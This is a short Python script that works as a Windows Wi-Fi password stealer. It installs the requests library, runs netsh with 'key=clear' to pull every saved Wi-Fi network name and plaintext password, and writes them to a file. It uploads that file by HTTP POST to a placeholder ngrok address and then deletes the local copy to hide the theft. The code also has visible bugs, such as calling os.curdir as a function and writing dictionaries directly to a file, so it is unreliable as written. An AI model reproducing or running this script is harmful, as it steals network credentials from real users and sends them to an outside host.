import re, sys, os, subprocess, requests

def install_package(package_name="requests"):
    pip_commands = [
        ['pip', 'install', package_name],
        ['pip3', 'install', package_name],
        [sys.executable, '-m', 'pip', 'install', package_name],
        [sys.executable, '-m', 'pip3', 'install', package_name]
    ]

    for cmd in pip_commands:
        try:
            subprocess.check_call(cmd)
            return
        except subprocess.CalledProcessError:
            pass
        
def run():

  install_package()

  command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
  profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

  wifi_list = []

  if len(profile_names) != 0:
    
    for name in profile_names:
      wifi_profile = {}
      profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
      
      if re.search("Security key           : Absent", profile_info):
          continue
      else:
        wifi_profile["ssid"] = name
        profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
        password = re.search("Key Content            : (.*)\r", profile_info_pass)

        if password == None:
          wifi_profile["password"] = None
        else:
          wifi_profile["password"] = password[1]
          wifi_list.append(wifi_profile)

  curr_path = os.curdir()

  with open(f"{curr_path}.txt", 'w') as f:
     for x in range(len(wifi_list)):
        f.write(wifi_list[x])

  url = "https://ngrok-url-here"
  files = {'file': open(f'{curr_path}.txt', 'rb')}

  requests.post(url, files=files)

  os.remove(f'{curr_path}.txt')


if __name__ == "__main__":
   run()
